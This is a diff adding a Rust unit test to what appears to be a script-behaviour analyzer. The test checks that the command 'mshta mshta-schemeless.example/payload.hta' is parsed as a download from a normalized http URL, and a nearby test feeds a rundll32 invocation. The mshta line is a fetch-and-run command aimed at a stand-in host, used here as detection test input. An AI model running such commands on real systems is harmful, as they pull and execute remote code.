@@ -7069,6 +7069,20 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn mshta_schemeless_domain_path_emits_normalized_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"mshta mshta-schemeless.example/payload.hta"#, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://mshta-schemeless.example/payload.hta" && dst.is_none()
+            )
+        });
+        assert!(has, "schemeless mshta URL not normalized: {:?}", env.traits);
+    }
+
+    #[test]
     fn rundll32_records_cmd() {
         let mut env = Environment::new(&Config::default());
         interpret_line("rundll32 some.dll,EntryPoint", &mut env);
